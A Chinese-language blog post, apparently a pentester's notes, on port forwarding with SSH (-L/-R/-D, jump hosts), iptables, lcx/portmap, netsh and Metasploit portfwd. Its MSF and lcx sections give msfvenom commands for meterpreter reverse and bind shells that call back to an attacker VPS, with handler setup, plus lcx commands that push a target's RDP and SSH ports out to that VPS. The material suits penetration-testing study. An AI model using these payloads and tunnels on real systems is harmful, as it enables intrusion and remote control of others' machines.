---
title: 端口转发
layout: post
tags:
  - sec
  - skills
  - proxy
category: 
  - hack
  - skills
comments: true
share: true
---

* TOC
{:toc}
<!--more-->

# SSH端口转发

SSH有三种端口转发模式：
- 本地端口转发
- 远程端口转发
- 动态端口转发

> 本地和远程端口转发，两者的方向相反。动态端口可以科学上网




## 本地端口转发

**本地端口转发：将发送到本地端口的请求，转发到目标端口。通过访问本地端口，访问目标端口的服务。**

```bash
ssh -L 本地网卡地址:本地端口:目标地址:目标端口 root@远程主机
```

### 本地端口转发详解

- 本地主机A1: SSH客户端
- 远程主机B1：SSH服务端
  - B1主机的IP为103.59.22.17
  - 该主机的一个服务端口为3000
- 主机B2：云主机B1同一内网的主机

本地A1登陆云主机B1，将发送到本地主机A1的2000端口 的请求，转发到远程云主机B1的3000端口。在本地A1主机上可以通过访问`127.0.0.1:2000`访问云主机B1上的服务。

```bash
ssh -L localhost:2000:localhost:3000 root@B1
```

`-L`指定的本地网卡地址可以省略，即`ssh -L localhost:2000:localhost:3000 root@B1`

> 若本地另一台主机A2能够访问本地主机A1，则A2也可以通过访问A1，访问云主机B1上的服务。

----------------------------------------------------

**`-L`的目标地址也可以是其他主机的地址：**

```bash
ssh -L 2000:B2的IP地址:3000 root@B1云主机的IP地址
```

> 从本地主机A1登陆云主机B1，并进行端口转发。将本地到2000端口的请求转发到主机B2的3000端口上，访问本地主机2000端口就是访问主机B2的3000端口

### [转发例子](http://b404.xyz/2017/11/30/Test-LAB-11/#)

**登陆远程主机`192.168.101.11`,并将发送到本地的3389端口的请求转发到`192.168.13.1`的3389端口上**

```bash
root@kali:~# ssh -L 3389:192.168.13.1:3389 -p 2222 -i ~/Desktop/officetwo.key tech@192.168.101.11
```


## 远程端口转发

**远程端口转发：将发送到远程端口的请求，转发到目标端口，这样就可以通过访问远程端口，访问目标端口的服务**

```bash
ssh -R 远程网卡地址：远程端口：目标地址：目标端口 root@远程主机
```

- 本地主机A1: SSH客户端
- 远程主机B1：SSH服务端
  - B1主机的IP为103.59.22.17
  - 该主机的一个服务端口为3000
- 主机A2：局域网本地主机A2

### 详解

远程端口转发，将发送到远程云主机B1端口3000的请求，转发到本地主机A1的端口2000。这样远程主机B1就可以通过访问本地的`127.0.0.1:3000`访问本地主机A1的服务

```bash
ssh -R localhost:3000:localhost:2000 root@远程主机B1
```

> 第一个localhost是云主机B1的localhost，第二个是本地主机A1的的localhost

`-R`指定的远程网卡地址可以省略，目标地址可以是其他主机地址。

在本地主机A1上登陆远程云主机B1，并将发送到云主机B1的3000端口的请求，转发到A2的2000端口

```bash
ssh -R 3000:A2的IP地址:2000 root@B1云主机的IP
```


## 动态端口转发

**动态端口转发绑定了一个本地端口，而`目标地址：目标端口`不固定，`目标地址：目标端口`是由发起请求决定**

先在终端输入：

```
ssh -D localhost:9050 root@VPS_IP -p端口
```

在本地主机上发起的请求，转发到远程的VPS上，让VPS真正实现发起的请求

在打开Socks代理，然后直接连接本地的9050端口可以上网：

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91.png)

> 若VPS主机3000端口有服务，则在具有socks代理的浏览器就可以进行本地访问`127.0.0.1:3000`，实现访问主机的3000端口

## 链式端口转发

**本地端口转发与远程端口转发结合起来使用，可以进行链式转发**

- A主机：在公司。运行了一个服务
- B主机：在家。
- C主机：远程VPS云主机

> A主机没有独立公共IP地址，且A、B主机不在同一个网络

### 本地端口转发

通过本地端口转发，在A1主机上登陆主机B1，将发送到A1主机的3000端口的请求，转发到B2主机的2000端口上：

```bash
ssh -L localhost:3000:B2的IP:2000 root@B1的IP
```

### 跳板

将host_middle机器作为跳板机跳转登陆server机器

```bash
ssh -J user1@host_middle_ip user2@server_host_ip
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_J_%E8%B7%B3%E6%9D%BF.png)

### 远程端口转发

通过远程端口转发，在A1主机上登陆主机B1，将发送到B2主机2000端口的请求，转发到A1主机的3000端口：

```bash
ssh -R B2的IP地址:2000:localhost:3000 root@B1的IP
```

### 总结

这是redrain大佬所写的[内网渗透随想](http://128.199.223.185/drops/tips-5234.html)（http://drops.wooyun.org/tips/5234）：

```bash
ssh -qTfnN -L port:host:host：port -l user remote_ip   #正向隧道，监听本地port
ssh -qTfnN -R port:host:host：port -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类
SSH -qTfnN -D port remotehost   #直接进行socks代理
```

这是l3m0n师傅的[从零开始内网渗透学习](https://github.com/l3m0n/pentest_study)所写：

```bash
本地访问127.0.0.1:port1就是host:port2(用的更多)
ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发

访问host:port2就是访问127.0.0.1:port1
ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发

可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
ssh -qTfnN -L port:dmz_host:host：port -l user remote_ip   #正向隧道，监听本地port

可以将dmz_host的hostport端口转发到remote_ip的port端口
ssh -qTfnN -R port:dmz_host:host：port -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类
```

> -C 进行数据压缩
> -q 安静模式
> -T 不占用 shell 了
> -f 后台运行，并推荐加上 -n 参数
> -N 不执行远程命令，端口转发就用它
> -g 允许所有远程主机连接到转发的端口


## MSF

### ssh本地转发

本节方案是 **攻击机器(kali)进行本地端口转发，然后进行正向监听连接转发后的本地端口**

```bash
思路： 
kali进行本地端口转发---->VPS（ssh -L）
----------------------------
            |
            |bind_tcp正向连接
            ↓
        目标机器
```

先在kali机器上使用msfvenom生成正向连接的meterpreter：

```bash
msfvenom -p windows/meterpreter/bind_tcp LHOST=10.10.10.129 LPORT=5454 -f exe -o S.exe
```

> LHOST的10.10.10.129是目标机器的IP

使用kali上的msfconsole监听：

```bash

```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_L_meterpreter_bind_tcp.png)

kali进行本地端口转发：

```bash
ssh -L localhost:1234:被攻击的目标机器:开的meterpreter端口 root@VPS的IP

ssh -L localhost:1234:10.10.10.129:5454 test@10.10.10.147
```

> 将到本地1234端口的请求通过vps(10.10.10.147)连接到目标机器的5454端口

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_L_meterpreter_bind_tcp_shell.png)


=============================================================

#  iptables转发

利用linux下的网络防火墙可以进行端口转发。

- A ：在家的机器
- B1：公网机器
- B2：公网机器B1所处内网的机器

登陆B1机器，在B1主机上先打开IP转发：

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward 
```

在添加NAT规则，并重启iptables：

```bash
service iptables stop
iptables -t nat -A PREROUTING --dst B1主机 -p tcp --dport 3306 -j DNAT --to-destination B2主机:3307
iptables -t nat -A POSTROUTING --dst B2主机 -p tcp --dport 3307 -j SNAT --to-source B1主机
service iptables save
service iptables start
```

-----------------------------------------------------

# lcx端口转发

lcx端口转发见klionsec师傅的[通向彼岸 之内网代理转发 lcx篇](https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)(https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)

## windows

在VPS上执行监听：

```bash
lcx -listen 监听来自外部的某个端口上的流量 转发到指定的本地端口上

lcx -listen 443 1234 
//监听，把外部到443端口的流量转发到本地的1234端口
```

![监听](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx%E7%9B%91%E5%90%AC.png)

然后在目标机器上执行：

```bash
lcx -slave 公网VPS的IP 在VPS上监听的端口  目标机器的IP 目标机器上指定的端口(常为RDP或SSH)

lcx -slave 103.*.*.* 443 192.168.3.23 3389
//把目标机器的3389端口流量转发到自己VPS的443端口上

lcx -slave 103.*.*.* 443 192.168.3.23 22
//把目标机器的22端口的流量转发到自己VPS的443端口上
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx%E8%BD%AC%E5%8F%91.png)

最后回到自己的vps上，看到连接正常建立，就可以使用指定工具连接到目标机器上

## Linux

linux版的就是portmap，可[下载](http://b404.xyz/usources/%E5%B7%A5%E5%85%B7/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx.rar)进行编译，在linux上实现端口转发。

先在vps上执行：

```bash
./lcx -m 2 -p1 443 -h2 VPS的IP -p2 1234

//监听，把外部到443端口的流量转发到本地的1234端口
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%911.png)

到目标机器上执行：

```bash
./lcx -m 3 -h1 目标机器的IP -p1 22 -h2 VPS的IP -p2 443
//把目标机器的22端口转到vps的443端口
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%913.png)

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%912.png)

最后回到VPS上执行：

```bash
ssh root@127.0.0.1 -p 1234 
//连接的1234端口实际是目标机器的22端口
```

## meterpreter

### lcx的tran

把来自公网的meterpreter流量通过VPS转发到本地的MSF中。

首先在VPS上搭建VPN。

现将本地kali连接到VPN内网（VPS搭建的VPN），然后走VPN内网做转发

回到VPS使用ping 测试kali所在VPN内网IP的连通性。

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/kali%E8%BF%9E%E6%8E%A5vpn.png)

在VPS上做转发，把来自外部到8080端口(一会儿msfvenom生成的payload回连端口)的流量通过VPN内网转发到kali的8080端口上：

```
lcx -tran 外部端口 指定机器的IP 指定机器上的端口

lcx -tran 8080 kali所处vpn内网IP 8080
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx_tran.png)

确认kali和VPS之间通信没问题之后，回到本地的kali中生成payload（payload回连的IP写VPS的IP）

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=*.*.*.*[payload的回连ip要设成vps的] LPORT=8080 -f exe -o /root/Desktop/shell.exe
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msfvenom.png)

paylaod生成之后，开始监听：

```bash
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 本机的vpn内网IP 
msf exploit(handler) > set lport 8080
msf exploit(handler) > exploit -j
```
![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msf.png)

在目标执行paylaod，meterpreter从公网正常弹回来

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/sessions.png)

### lcx的listen

先使用msfvenom生成反向连接的meterpreter，LHOST填写vps的地址：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=VPS的IP LPORT=5353 -f exe -o Fuck.exe
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msfvenom_listen.png)

在vps上使用lcx进行本地端口转发：

```bash
lcx -listen 5353(meterpreter反弹的端口) 1234
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx_listen_msf.png)

在本地的kali机器上设置监听，并正向连接vps上转发的端口：

```bash
msf > use exploit/multi/handler 

msf exploit(handler) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp

msf exploit(handler) > set RHOST VPS的IP
RHOST => 10.10.10.171

msf exploit(handler) > set LPORT VPS上转发后的端口
LPORT => 1234
```

在目标机器上运行meterpreter，本地msf就能正常连接反弹的meterpreter。

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/meterpreter_lcx.png)

-----------------------------------------------

# netsh转发(只支持TCP协议)

netsh转发见[在windows上用netsh动态配置端口转发](http://aofengblog.blog.163.com/blog/static/631702120148573851740/)

设置转发规则：

```bash
netsh interface portproxy set v4tov4 listenaddress=192.168.200.20 listenport=3388 connectaddress=192.168.200.10 connectport=3389
```

![](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/netsh/netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.png)


删除转发规则：

```bash
netsh interface portproxy delete v4tov4 listenaddress=192.168.200.20 listenport=3388
```

![删除](/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/netsh/netsh%E5%88%A0%E9%99%A4%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99.png)

# msf的portfwd

得到meterpreter之后，进行portfwd,将`192.168.200.20`的3389端口转发到本地的4568端口：

```bash
meterpreter > portfwd add -l 4568 192.168.200.20 -p 3389  
```







# Refer

- [玩转SSH端口转发](https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/):https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/
- [linux端口映射](https://my.oschina.net/whp/blog/157214):https://my.oschina.net/whp/blog/157214
- [实战 SSH 端口转发](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html):https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html
- [Proxies_and_Jump_Hosts](https://en.m.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts):https://en.m.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts
- [内网渗透随想](http://128.199.223.185/drops/tips-5234.html):http://drops.wooyun.org/tips/5234
- [从零开始内网渗透学习](https://github.com/l3m0n/pentest_study):https://github.com/l3m0n/pentest_study
- [SSH Port Forwarding>](http://staff.washington.edu/corey/fw/ssh-port-forwarding.html):http://staff.washington.edu/corey/fw/ssh-port-forwarding.html
- [通向彼岸 之内网代理转发 lcx篇](https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)(https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)